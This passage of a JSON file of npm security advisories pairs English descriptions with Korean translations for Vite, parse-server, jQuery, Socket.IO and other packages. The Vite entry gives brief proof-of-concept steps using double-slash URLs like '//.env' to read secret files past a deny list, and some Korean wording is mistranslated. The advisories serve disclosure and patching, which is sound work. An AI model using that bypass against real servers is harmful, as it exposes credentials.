    "descriptionKR": "### 요약\nVite 서버 옵션(`server.fs.deny`)은 이중 슬래시(//)를 사용하여 우회할 수 있으므로 인증되지 않은 사용자는 기본 [`fs.deny` 설정을 포함하여 애플리케이션의 Vite 루트 경로에서 파일을 읽을 수 있습니다. ](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']` )\n\n### 영향\nVite 개발 서버를 네트워크에 명시적으로 노출하는 사용자만(`--host` 또는 [`server.host` 구성 옵션 사용](https://vitejs.dev/config/server-options.html#server-host)) 영향을 받고 바로 Vite 프로젝트 루트 폴더에 있는 파일만 노출될 수 있습니다.\n\n### 패치\nvite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5에서 수정됨\n그리고 이전 두 전공의 최신 부전공: vite@3.2.7, vite@2.9.16\n\n### 세부 정보\nVite는 개발 모드에서 실행되는 동안 프로젝트의 루트 경로 아래에서 애플리케이션을 제공합니다. 기본적으로 서버 옵션 fs.deny를 사용하여 파일의 민감한 정보를 보호하십시오. 그러나 단순히 이중 슬래시를 사용하여 이 fs 제한을 우회할 수 있습니다.\n\n### PoC\n1. 패키지 관리자를 사용하여 vite의 새로운 최신 프로젝트를 만듭니다. (여기서는 테스트 및 pnpm에 반응 및 vue 템플릿을 사용하고 있습니다)\n2. pnpm run dev를 사용하여 개발 모드에서 애플리케이션을 제공합니다.\n3. 이중 슬래시(`//`)를 사용하여 URL에서 파일에 직접 액세스(예: `//.env`, `//.env.local`)\n4. 서버 옵션 `fs.deny` 제한이 성공적으로 우회되었습니다.\n\n증거 이미지:\n![증명-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![증명-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)"
  },
  {
    "description": "A remote attacker can trigger a denial of service in the `socket.remoteAddress` variable, by sending a crafted HTTP request. Usage of the undefined variable raises a TypeError exception.\n\n",
    "identifiers": "GHSA : GHSA-mj6p-3pc9-wf5m\nCVE : CVE-2023-2968",
    "severity": "MODERATE",
    "updatedAt": "2023-06-06T01:52:50Z",
    "publishedAt": "2023-05-30T18:30:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2968\nhttps://research.jfrog.com/vulnerabilities/undefined-variable-usage-in-proxy-leads-to-remote-denial-of-service-xray-520917\nhttps://github.com/TooTallNate/proxy-agents/pull/178\nhttps://github.com/TooTallNate/proxy-agents/commit/25e0c931390eb8f41c5ceaca72820de9198ece39\nhttps://github.com/advisories/GHSA-mj6p-3pc9-wf5m",
    "name": "proxy",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.1.1",
    "identifier": "2.1.1",
    "descriptionKR": "원격 공격자는 조작된 HTTP 요청을 전송하여 `socket.remoteAddress` 변수에서 서비스 거부를 트리거할 수 있습니다. 정의되지 않은 변수를 사용하면 TypeError 예외가 발생합니다."
  },
  {
    "description": "Prototype Pollution in GitHub repository antfu/utils prior to 0.7.3.",
    "identifiers": "GHSA : GHSA-p2fh-2h23-6grg\nCVE : CVE-2023-2972",
    "severity": "MODERATE",
    "updatedAt": "2023-06-02T17:11:19Z",
    "publishedAt": "2023-05-30T12:30:17Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-2972\nhttps://github.com/antfu/utils/commit/7f8b16c6181c988bdb96613fbb2533b345f68682\nhttps://huntr.dev/bounties/009f1cd9-401c-49a7-bd08-be35cff6faef\nhttps://github.com/advisories/GHSA-p2fh-2h23-6grg",
    "name": "@antfu/utils",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.7.3",
    "identifier": "0.7.3",
    "descriptionKR": "0.7.3 이전의 GitHub 저장소 antfu/utils의 Prototype Pollution."
  },
  {
    "description": "### Impact\n\nPhishing attack vulnerability by uploading malicious files. A malicious user could upload a HTML file to Parse Server via its public API. That HTML file would then be accessible at the internet domain at which Parse Server is hosted. The URL of the the uploaded HTML could be shared for phishing attacks. The HTML page may seem legitimate because it is served under the internet domain where Parse Server is hosted, which may be the same as a company's official website domain.\n\nAn additional security issue arises when the Parse JavaScript SDK is used. The SDK stores sessions in the internet browser's local storage, which usually restricts data access depending on the internet domain. A malicious HTML file could contain a script that retrieves the user's session token from local storage and then share it with the attacker.\n\n### Patches\n\nThe fix adds a new Parse Server option `fileUpload.fileExtensions` to restrict file upload on Parse Server by file extension. It is recommended to restrict file upload for HTML file extensions, which this fix disables by default. If an app requires upload of files with HTML file extensions, the option can be set to `['.*']` or another custom value to override the default.\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\n- https://github.com/parse-community/parse-server/pull/8538 (Parse Server 6)\n- https://github.com/parse-community/parse-server/pull/8537 (Parse Server 5)\n",
    "identifiers": "GHSA : GHSA-9prm-jqwx-45x9\nCVE : CVE-2023-32689",
    "severity": "MODERATE",
    "updatedAt": "2023-05-31T23:39:16Z",
    "publishedAt": "2023-05-31T23:39:15Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32689\nhttps://github.com/parse-community/parse-server/pull/8537\nhttps://github.com/parse-community/parse-server/pull/8538\nhttps://github.com/advisories/GHSA-9prm-jqwx-45x9",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.1.1",
    "identifier": "6.1.1",
    "descriptionKR": "### 영향\n\n악성 파일 업로드에 의한 피싱 공격 취약점. 악의적인 사용자는 공용 API를 통해 Parse Server에 HTML 파일을 업로드할 수 있습니다. 그러면 해당 HTML 파일은 Parse Server가 호스팅되는 인터넷 도메인에서 액세스할 수 있습니다. 업로드된 HTML의 URL이 피싱 공격을 위해 공유될 수 있습니다. HTML 페이지는 Parse Server가 호스팅되는 인터넷 도메인(회사의 공식 웹사이트 도메인과 동일할 수 있음)에서 제공되기 때문에 합법적인 것처럼 보일 수 있습니다.\n\nParse JavaScript SDK를 사용할 때 추가적인 보안 문제가 발생합니다. SDK는 일반적으로 인터넷 도메인에 따라 데이터 액세스를 제한하는 인터넷 브라우저의 로컬 스토리지에 세션을 저장합니다. 악의적인 HTML 파일에는 로컬 저장소에서 사용자의 세션 토큰을 검색한 다음 공격자와 공유하는 스크립트가 포함될 수 있습니다.\n\n### 패치\n\n이 수정 사항은 새로운 Parse Server 옵션인 'fileUpload.fileExtensions'를 추가하여 Parse Server에서 파일 확장자로 파일 업로드를 제한합니다. 이 수정 사항은 기본적으로 비활성화되어 있는 HTML 파일 확장자에 대한 파일 업로드를 제한하는 것이 좋습니다. 앱에서 HTML 파일 확장자를 가진 파일을 업로드해야 하는 경우 옵션을 `['.*']` 또는 다른 사용자 지정 값으로 설정하여 기본값을 재정의할 수 있습니다.\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\n- https://github.com/parse-community/parse-server/pull/8538(파스 서버 6)\n- https://github.com/parse-community/parse-server/pull/8537(파스 서버 5)"
  },
  {
    "description": "### Impact\n\nPhishing attack vulnerability by uploading malicious files. A malicious user could upload a HTML file to Parse Server via its public API. That HTML file would then be accessible at the internet domain at which Parse Server is hosted. The URL of the the uploaded HTML could be shared for phishing attacks. The HTML page may seem legitimate because it is served under the internet domain where Parse Server is hosted, which may be the same as a company's official website domain.\n\nAn additional security issue arises when the Parse JavaScript SDK is used. The SDK stores sessions in the internet browser's local storage, which usually restricts data access depending on the internet domain. A malicious HTML file could contain a script that retrieves the user's session token from local storage and then share it with the attacker.\n\n### Patches\n\nThe fix adds a new Parse Server option `fileUpload.fileExtensions` to restrict file upload on Parse Server by file extension. It is recommended to restrict file upload for HTML file extensions, which this fix disables by default. If an app requires upload of files with HTML file extensions, the option can be set to `['.*']` or another custom value to override the default.\n\n### References\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\n- https://github.com/parse-community/parse-server/pull/8538 (Parse Server 6)\n- https://github.com/parse-community/parse-server/pull/8537 (Parse Server 5)\n",
    "identifiers": "GHSA : GHSA-9prm-jqwx-45x9\nCVE : CVE-2023-32689",
    "severity": "MODERATE",
    "updatedAt": "2023-05-31T23:39:16Z",
    "publishedAt": "2023-05-31T23:39:15Z",
    "references": "https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-32689\nhttps://github.com/parse-community/parse-server/pull/8537\nhttps://github.com/parse-community/parse-server/pull/8538\nhttps://github.com/advisories/GHSA-9prm-jqwx-45x9",
    "name": "parse-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.4.4",
    "identifier": "5.4.4",
    "descriptionKR": "### 영향\n\n악성 파일 업로드에 의한 피싱 공격 취약점. 악의적인 사용자는 공용 API를 통해 Parse Server에 HTML 파일을 업로드할 수 있습니다. 그러면 해당 HTML 파일은 Parse Server가 호스팅되는 인터넷 도메인에서 액세스할 수 있습니다. 업로드된 HTML의 URL이 피싱 공격을 위해 공유될 수 있습니다. HTML 페이지는 Parse Server가 호스팅되는 인터넷 도메인(회사의 공식 웹사이트 도메인과 동일할 수 있음)에서 제공되기 때문에 합법적인 것처럼 보일 수 있습니다.\n\nParse JavaScript SDK를 사용할 때 추가적인 보안 문제가 발생합니다. SDK는 일반적으로 인터넷 도메인에 따라 데이터 액세스를 제한하는 인터넷 브라우저의 로컬 저장소에 세션을 저장합니다. 악의적인 HTML 파일에는 로컬 저장소에서 사용자의 세션 토큰을 검색한 다음 공격자와 공유하는 스크립트가 포함될 수 있습니다.\n\n### 패치\n\n이 수정 사항은 새로운 Parse Server 옵션인 'fileUpload.fileExtensions'를 추가하여 Parse Server에서 파일 확장자로 파일 업로드를 제한합니다. 이 수정 사항은 기본적으로 비활성화되어 있는 HTML 파일 확장자에 대한 파일 업로드를 제한하는 것이 좋습니다. 앱에서 HTML 파일 확장자를 가진 파일을 업로드해야 하는 경우 옵션을 `['.*']` 또는 다른 사용자 지정 값으로 설정하여 기본값을 재정의할 수 있습니다.\n\n### 참조\n\n- https://github.com/parse-community/parse-server/security/advisories/GHSA-9prm-jqwx-45x9\n- https://github.com/parse-community/parse-server/pull/8538(파스 서버 6)\n- https://github.com/parse-community/parse-server/pull/8537(파스 서버 5)"
  },
  {
    "description": "Affected versions of `jquery` interpret `text/javascript` responses from cross-origin ajax requests, and automatically execute the contents in `jQuery.globalEval`, even when the ajax request doesn't contain the `dataType` option.\n\n\n## Recommendation\n\nUpdate to version 3.0.0 or later.",
    "identifiers": "GHSA : GHSA-rmxg-73gg-4p98\nCVE : CVE-2015-9251",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T12:59:30Z",
    "publishedAt": "2018-01-22T13:32:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2015-9251\nhttps://github.com/jquery/jquery/issues/2432\nhttps://github.com/jquery/jquery/pull/2588\nhttps://github.com/jquery/jquery/commit/b078a62013782c7424a4a61a240c23c4c0b42614\nhttps://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2\nhttps://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc\nhttps://access.redhat.com/errata/RHSA-2020:0481\nhttps://access.redhat.com/errata/RHSA-2020:0729\nhttps://ics-cert.us-cert.gov/advisories/ICSA-18-212-04\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601\nhttps://lists.apache.org/thread.html/10f0f3aefd51444d1198c65f44ffdf2d78ca3359423dbc1c168c9731@%3Cdev.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/17ff53f7999e74fbe3cc0ceb4e1c3b00b180b7c5afec8e978837bc49@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/52bafac05ad174000ea465fe275fd3cc7bd5c25535a7631c0bc9bfb2@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/54df3aeb4239b64b50b356f0ca6f986e3c4ca5b84c515dce077c7854@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/ba79cf1658741e9f146e4c59b50aee56656ea95d841d358d006c18b6@%3Ccommits.roller.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://security.netapp.com/advisory/ntap-20210108-0004/\nhttps://snyk.io/vuln/npm:jquery:20150627\nhttps://sw.aveva.com/hubfs/assets-2018/pdf/security-bulletin/SecurityBulletin_LFSec126.pdf\nhttps://www.oracle.com/security-alerts/cpuapr2020.html\nhttps://www.oracle.com/security-alerts/cpujan2020.html\nhttps://www.oracle.com/security-alerts/cpujul2020.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html\nhttps://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html\nhttps://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html\nhttps://www.tenable.com/security/tns-2019-08\nhttp://lists.opensuse.org/opensuse-security-announce/2020-03/msg00041.html\nhttp://packetstormsecurity.com/files/152787/dotCMS-5.1.1-Vulnerable-Dependencies.html\nhttp://packetstormsecurity.com/files/153237/RetireJS-CORS-Issue-Script-Execution.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttp://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html\nhttps://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-450227\nhttps://github.com/jquery/jquery/issues/2432#issuecomment-403761229\nhttps://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#420\nhttps://github.com/rails/jquery-rails/blob/v4.2.0/vendor/assets/javascripts/jquery3.js#L9377\nhttps://web.archive.org/web/20200227030101/http://www.securityfocus.com/bid/105658\nhttps://github.com/rails/jquery-rails/releases/tag/v4.2.0\nhttps://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2015-9251.yml\nhttps://github.com/advisories/GHSA-rmxg-73gg-4p98",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 1.12.3, < 3.0.0",
    "identifier": "3.0.0",
    "descriptionKR": "영향을 받는 `jquery` 버전은 원본 간 ajax 요청에서 `text/javascript` 응답을 해석하고, ajax 요청에 `dataType` 옵션이 포함되지 않은 경우에도 `jQuery.globalEval`의 콘텐츠를 자동으로 실행합니다.\n\n\n## 추천\n\n버전 3.0.0 이상으로 업데이트하십시오."
  },
  {
    "description": "Affected versions of `jquery` interpret `text/javascript` responses from cross-origin ajax requests, and automatically execute the contents in `jQuery.globalEval`, even when the ajax request doesn't contain the `dataType` option.\n\n\n## Recommendation\n\nUpdate to version 3.0.0 or later.",
    "identifiers": "GHSA : GHSA-rmxg-73gg-4p98\nCVE : CVE-2015-9251",
    "severity": "MODERATE",
    "updatedAt": "2023-07-10T12:59:30Z",
    "publishedAt": "2018-01-22T13:32:06Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2015-9251\nhttps://github.com/jquery/jquery/issues/2432\nhttps://github.com/jquery/jquery/pull/2588\nhttps://github.com/jquery/jquery/commit/b078a62013782c7424a4a61a240c23c4c0b42614\nhttps://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2\nhttps://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc\nhttps://access.redhat.com/errata/RHSA-2020:0481\nhttps://access.redhat.com/errata/RHSA-2020:0729\nhttps://ics-cert.us-cert.gov/advisories/ICSA-18-212-04\nhttps://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601\nhttps://lists.apache.org/thread.html/10f0f3aefd51444d1198c65f44ffdf2d78ca3359423dbc1c168c9731@%3Cdev.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/17ff53f7999e74fbe3cc0ceb4e1c3b00b180b7c5afec8e978837bc49@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/52bafac05ad174000ea465fe275fd3cc7bd5c25535a7631c0bc9bfb2@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/54df3aeb4239b64b50b356f0ca6f986e3c4ca5b84c515dce077c7854@%3Cuser.flink.apache.org%3E\nhttps://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E\nhttps://lists.apache.org/thread.html/ba79cf1658741e9f146e4c59b50aee56656ea95d841d358d006c18b6@%3Ccommits.roller.apache.org%3E\nhttps://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E\nhttps://seclists.org/bugtraq/2019/May/18\nhttps://security.netapp.com/advisory/ntap-20210108-0004/\nhttps://snyk.io/vuln/npm:jquery:20150627\nhttps://sw.aveva.com/hubfs/assets-2018/pdf/security-bulletin/SecurityBulletin_LFSec126.pdf\nhttps://www.oracle.com/security-alerts/cpuapr2020.html\nhttps://www.oracle.com/security-alerts/cpujan2020.html\nhttps://www.oracle.com/security-alerts/cpujul2020.html\nhttps://www.oracle.com/security-alerts/cpuoct2020.html\nhttps://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html\nhttps://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html\nhttps://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html\nhttps://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html\nhttps://www.tenable.com/security/tns-2019-08\nhttp://lists.opensuse.org/opensuse-security-announce/2020-03/msg00041.html\nhttp://packetstormsecurity.com/files/152787/dotCMS-5.1.1-Vulnerable-Dependencies.html\nhttp://packetstormsecurity.com/files/153237/RetireJS-CORS-Issue-Script-Execution.html\nhttp://packetstormsecurity.com/files/156743/OctoberCMS-Insecure-Dependencies.html\nhttp://seclists.org/fulldisclosure/2019/May/10\nhttp://seclists.org/fulldisclosure/2019/May/11\nhttp://seclists.org/fulldisclosure/2019/May/13\nhttp://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html\nhttps://security.snyk.io/vuln/SNYK-DOTNET-JQUERY-450227\nhttps://github.com/jquery/jquery/issues/2432#issuecomment-403761229\nhttps://github.com/rails/jquery-rails/blob/master/CHANGELOG.md#420\nhttps://github.com/rails/jquery-rails/blob/v4.2.0/vendor/assets/javascripts/jquery3.js#L9377\nhttps://web.archive.org/web/20200227030101/http://www.securityfocus.com/bid/105658\nhttps://github.com/rails/jquery-rails/releases/tag/v4.2.0\nhttps://github.com/rubysec/ruby-advisory-db/blob/master/gems/jquery-rails/CVE-2015-9251.yml\nhttps://github.com/advisories/GHSA-rmxg-73gg-4p98",
    "name": "jquery",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.12.2",
    "identifier": "1.12.2",
    "descriptionKR": "영향을 받는 `jquery` 버전은 원본 간 ajax 요청에서 `text/javascript` 응답을 해석하고, ajax 요청에 `dataType` 옵션이 포함되지 않은 경우에도 `jQuery.globalEval`의 콘텐츠를 자동으로 실행합니다.\n\n\n## 추천\n\n버전 3.0.0 이상으로 업데이트하십시오."
  },
  {
    "description": "All versions of the package n158 are vulnerable to Command Injection due to improper input sanitization in the 'module.exports' function.\n\n**Note:**\n\nTo execute the code snippet and potentially exploit the vulnerability, the attacker needs to have the ability to run Node.js code within the target environment. This typically requires some level of access to the system or application hosting the Node.js environment.",
    "identifiers": "GHSA : GHSA-549h-r7g9-2qpf\nCVE : CVE-2023-26127",
    "severity": "HIGH",
    "updatedAt": "2023-06-02T22:20:51Z",
    "publishedAt": "2023-05-27T06:30:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26127\nhttps://github.com/dsilva2401/n158/blob/master/src/cli/initProject.js#L8\nhttps://security.snyk.io/vuln/SNYK-JS-N158-3183746\nhttps://github.com/advisories/GHSA-549h-r7g9-2qpf",
    "name": "n158",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.4.1",
    "descriptionKR": "패키지 n158의 모든 버전은 'module.exports' 기능의 부적절한 입력 삭제로 인해 명령 주입에 취약합니다.\n\n**메모:**\n\n코드 스니펫을 실행하고 잠재적으로 취약성을 악용하려면 공격자가 대상 환경 내에서 Node.js 코드를 실행할 수 있어야 합니다. 이를 위해서는 일반적으로 Node.js 환경을 호스팅하는 시스템 또는 애플리케이션에 대한 일정 수준의 액세스 권한이 필요합니다."
  },
  {
    "description": "All versions of the package keep-module-latest are vulnerable to Command Injection due to missing input sanitization or other checks and sandboxes being employed to the installModule function.\n\n**Note:**\n\nTo execute the code snippet and potentially exploit the vulnerability, the attacker needs to have the ability to run Node.js code within the target environment. This typically requires some level of access to the system or application hosting the Node.js environment.",
    "identifiers": "GHSA : GHSA-wxrx-pc44-rcgc\nCVE : CVE-2023-26128",
    "severity": "HIGH",
    "updatedAt": "2023-06-02T22:19:15Z",
    "publishedAt": "2023-05-27T06:30:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26128\nhttps://github.com/liujunyang/keep-module-latest/blob/master/index.js%23L50\nhttps://security.snyk.io/vuln/SNYK-JS-KEEPMODULELATEST-3157165\nhttps://github.com/advisories/GHSA-wxrx-pc44-rcgc",
    "name": "keep-module-latest",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.1",
    "descriptionKR": "패키지 keep-module-latest의 모든 버전은 누락된 입력 삭제 또는 installModule 기능에 사용되는 기타 검사 및 샌드박스로 인해 명령 주입에 취약합니다.\n\n**메모:**\n\n코드 스니펫을 실행하고 잠재적으로 취약성을 악용하려면 공격자가 대상 환경 내에서 Node.js 코드를 실행할 수 있어야 합니다. 이를 위해서는 일반적으로 Node.js 환경을 호스팅하는 시스템 또는 애플리케이션에 대한 일정 수준의 액세스 권한이 필요합니다."
  },
  {
    "description": "All versions of the package bwm-ng are vulnerable to Command Injection due to improper input sanitization in the 'check' function in the bwm-ng.js file. \n\n**Note:**\n\nTo execute the code snippet and potentially exploit the vulnerability, the attacker needs to have the ability to run Node.js code within the target environment. This typically requires some level of access to the system or application hosting the Node.js environment.",
    "identifiers": "GHSA : GHSA-8vw3-vxmj-h43w\nCVE : CVE-2023-26129",
    "severity": "HIGH",
    "updatedAt": "2023-06-06T17:21:42Z",
    "publishedAt": "2023-05-27T06:30:41Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26129\nhttps://security.snyk.io/vuln/SNYK-JS-BWMNG-3175876\nhttps://github.com/advisories/GHSA-8vw3-vxmj-h43w",
    "name": "bwm-ng",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.1",
    "descriptionKR": "패키지 bwm-ng의 모든 버전은 bwm-ng.js 파일의 'check' 기능에서 부적절한 입력 삭제로 인해 명령 주입에 취약합니다.\n\n**메모:**\n\n코드 스니펫을 실행하고 잠재적으로 취약성을 악용하려면 공격자가 대상 환경 내에서 Node.js 코드를 실행할 수 있어야 합니다. 이를 위해서는 일반적으로 Node.js 환경을 호스팅하는 시스템 또는 애플리케이션에 대한 일정 수준의 액세스 권한이 필요합니다."
  },
  {
    "description": "connect node module before 2.14.0 suffers from a Cross-Site Scripting (XSS) vulnerability due to a lack of validation of file in directory.js middleware.",
    "identifiers": "GHSA : GHSA-rch9-xh7r-mqgw\nCVE : CVE-2018-3717",
    "severity": "MODERATE",
    "updatedAt": "2023-05-30T19:26:14Z",
    "publishedAt": "2018-07-26T15:08:05Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2018-3717\nhttps://github.com/JacksonTian/anywhere/issues/33#issuecomment-366527448\nhttps://hackerone.com/reports/309394\nhttps://hackerone.com/reports/309641\nhttps://github.com/advisories/GHSA-rch9-xh7r-mqgw\nhttps://www.npmjs.com/advisories/584\nhttps://www.npmjs.com/advisories/595\nhttps://github.com/senchalabs/connect/commit/6d5dd30075d2bc4ee97afdbbe3d9d98d8d52d74b",
    "name": "connect",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.14.0",
    "identifier": "2.14.0",
    "descriptionKR": "2.14.0 이전의 연결 노드 모듈은 directory.js 미들웨어의 파일 유효성 검사 부족으로 인해 XSS(교차 사이트 스크립팅) 취약점이 있습니다."
  },
  {
    "description": "### Impact\nHighlight may record passwords on customer deployments when a password html input is switched to `type=\"text\"` via a javascript \"Show Password\" button. This differs from the expected behavior which always obfuscates `type=\"password\"` inputs. A customer may assume that switching to `type=\"text\"` would also not record this input; hence, they would not add additional `highlight-mask` css-class obfuscation to this part of the DOM, resulting in unintentional recording of a password value when a `Show Password` button is used.\n\n### Patches\n`highlight.run@6.0.0` resolves the issue via https://github.com/rrweb-io/rrweb/pull/1184\nThis patch tracks changes to the `type` attribute of an input to ensure an input that used to be a `type=\"password\"` continues to be obfuscated. \n\n### Workarounds\nWe have deployed a change to our data ingest to obfuscate passwords server side from older clients.\nThis means that upgrading to the latest version of highlight.run is not necessary but recommended to prevent potential network transfer of recorded password data to our backend.\n\n### References\nhttps://github.com/rrweb-io/rrweb/pull/1184\n",
    "identifiers": "GHSA : GHSA-9qpj-qq2r-5mcc\nCVE : CVE-2023-33187",
    "severity": "MODERATE",
    "updatedAt": "2023-05-26T21:50:46Z",
    "publishedAt": "2023-05-26T13:52:19Z",
    "references": "https://github.com/highlight/highlight/security/advisories/GHSA-9qpj-qq2r-5mcc\nhttps://github.com/rrweb-io/rrweb/pull/1184\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-33187\nhttps://github.com/advisories/GHSA-9qpj-qq2r-5mcc",
    "name": "highlight.run",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.0.0",
    "identifier": "6.0.0",
    "descriptionKR": "### 영향\nHighlight는 비밀번호 html 입력이 javascript \"비밀번호 표시\" 버튼을 통해 `type=\"text\"`로 전환될 때 고객 배포에 비밀번호를 기록할 수 있습니다. 이것은 항상 `type=\"password\"` 입력을 난독화하는 예상 동작과 다릅니다. 고객은 `type=\"text\"`로 전환해도 이 입력이 기록되지 않는다고 생각할 수 있습니다. 따라서 DOM의 이 부분에 'highlight-mask' css 클래스 난독화를 추가하지 않아 'Show Password' 버튼을 사용할 때 의도치 않게 비밀번호 값이 기록됩니다.\n\n### 패치\n`highlight.run@6.0.0`은 https://github.com/rrweb-io/rrweb/pull/1184를 통해 문제를 해결합니다.\n이 패치는 `type=\"password\"`였던 입력이 계속 난독화되도록 입력의 `type` 속성에 대한 변경 사항을 추적합니다.\n\n### 해결 방법\n이전 클라이언트에서 서버 측 암호를 난독화하기 위해 데이터 수집에 대한 변경 사항을 배포했습니다.\n즉, Highlight.run의 최신 버전으로 업그레이드할 필요는 없지만 기록된 비밀번호 데이터가 백엔드로 네트워크에서 전송되는 것을 방지하기 위해 권장됩니다.\n\n### 참조\nhttps://github.com/rrweb-io/rrweb/pull/1184"
  },
  {
    "description": "### Impact\n\nA specially crafted Socket.IO packet can trigger an uncaught exception on the Socket.IO server, thus killing the Node.js process.\n\n```\nTypeError: Cannot convert object to primitive value\n       at Socket.emit (node:events:507:25)\n       at .../node_modules/socket.io/lib/socket.js:531:14\n```\n\n### Patches\n\nA fix has been released today (2023/05/22):\n\n- https://github.com/socketio/socket.io-parser/commit/3b78117bf6ba7e99d7a5cfc1ba54d0477554a7f3, included in `socket.io-parser@4.2.3`\n- https://github.com/socketio/socket.io-parser/commit/2dc3c92622dad113b8676be06f23b1ed46b02ced, included in `socket.io-parser@3.4.3`\n\n| `socket.io` version | `socket.io-parser` version                                                                              | Needs minor update?                  |\n|---------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|\n| `4.5.2...latest`    | `~4.2.0` ([ref](https://github.com/socketio/socket.io/commit/9890b036cf942f6b6ad2afeb6a8361c32cd5d528)) | `npm audit fix` should be sufficient |\n| `4.1.3...4.5.1`     | `~4.1.1` ([ref](https://github.com/socketio/socket.io/commit/7c44893d7878cd5bba1eff43150c3e664f88fb57)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.5...4.1.2`     | `~4.0.3` ([ref](https://github.com/socketio/socket.io/commit/752dfe3b1e5fecda53dae899b4a39e6fed5a1a17)) | Please upgrade to `socket.io@4.6.x`  |\n| `3.0.0...3.0.4`     | `~4.0.1` ([ref](https://github.com/socketio/socket.io/commit/1af3267e3f5f7884214cf2ca4d5282d620092fb0)) | Please upgrade to `socket.io@4.6.x`  |\n| `2.3.0...2.5.0`     | `~3.4.0` ([ref](https://github.com/socketio/socket.io/commit/cf39362014f5ff13a17168b74772c43920d6e4fd)) | `npm audit fix` should be sufficient |\n\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open a discussion [here](https://github.com/socketio/socket.io/discussions)\n\nThanks to [@rafax00](https://github.com/rafax00) for the responsible 